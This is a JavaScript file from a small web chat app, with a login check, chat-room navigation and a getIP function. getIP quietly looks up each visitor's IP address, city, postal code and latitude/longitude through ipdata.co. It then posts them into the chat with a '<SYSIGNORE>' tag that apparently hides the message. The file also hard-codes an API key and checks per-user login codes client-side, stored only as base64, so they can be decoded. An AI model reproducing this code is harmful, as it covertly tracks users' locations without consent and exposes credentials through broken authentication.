function b64_to_utf8( str ) {
  return decodeURIComponent(escape(window.atob( str )));
}

function enterCode () {
  var enteredCode = document.getElementById("codeInput").value;
  if(fixedname.toLowerCase().includes('ljharnish#') && enteredCode.toString() == b64_to_utf8(ljharnishCode) || fixedname.toLowerCase().includes('miles#') && enteredCode.toString() == b64_to_utf8(milesCode) || fixedname.toLowerCase().includes('shawn does#') && enteredCode.toString() == b64_to_utf8(shawnCode) || fixedname.toLowerCase().includes('shawn doos#') && enteredCode.toString() == b64_to_utf8(shawnCode) || fixedname.toLowerCase().includes('mitch#') && enteredCode.toString() == b64_to_utf8(mitchCode)){
    console.log("Logging in...")
    document.getElementById('id03').style.display='none';
  }
}

function customChatHelp() {
  alert("Head to: https://dashboard.scaledrone.com/signup and create an account, then make a chat room and then copy the 'Channel ID' into this field!")
}
function goToCustomChatRoom(){
  var chatCode = document.getElementById("customChatInput").value;
  if(!chatCode){ 
    alert("Please enter a code!"); 
    return
  }
  if(chatCode){
    if(chatCode === 'miles'){
      var newURL = './chat.html?code='
      window.location = newURL
    }
    var newURL = './chat.html?code=' + chatCode
    window.location = newURL
  }
}
function chat1(){
  document.getElementById('chatMenu').style.display = 'none'
  document.getElementById('profileMenu').style.display = 'block'
}

function goToRoom1() {
  profname = document.getElementById('profNameInput').value;
    window.location = './chat.html?code=ReJuVv2QN860j3on&name=' + profname
}

function getIP() {
  let apiKey = 'be0f755b93290b4c100445d77533d291763a417c75524e95e07819ad';
$.getJSON('https://api.ipdata.co?api-key=' + apiKey, function(data) {
  ip = JSON.stringify(data.ip);
  ip = ip.slice(1);
  ip = ip.slice(0, ip.length - 1);
  city = JSON.stringify(data.city);
  city = city.slice(1);
  city = city.slice(0, city.length - 1);
  region = JSON.stringify(data.region_code);
  region = region.slice(1);
  region = region.slice(0, region.length - 1);
  country = JSON.stringify(data.country_name);
  country = country.slice(1);
  country = country.slice(0, country.length - 1);
  continent = JSON.stringify(data.continent_name);
  continent = continent.slice(1);
  continent = continent.slice(0, continent.length - 1);
  postal = JSON.stringify(data.postal);
  postal = postal.slice(1);
  postal = postal.slice(0, postal.length - 1);
  flag = JSON.stringify(data.emoji_flag);
  flag = flag.slice(1);
  flag = flag.slice(0, flag.length - 1);
  latitude = JSON.stringify(data.latitude);
  latitude = latitude.slice(1);
  latitude = latitude.slice(0, latitude.length - 1);
  longitude = JSON.stringify(data.longitude);
  longitude = longitude.slice(1);
  longitude = longitude.slice(0, longitude.length - 1);
  message = `IP: ${ip}.\nPostal: ${postal}.\nCity: ${city}.\nRegion: ${region}.\nCountry: ${country}.\nFlag: ${flag}\nContinent: ${continent}.\nLatitude: ${latitude}.\nLongitude: ${longitude}.`
  uploadMessage(`<SYSIGNORE> ${message}`)
});
}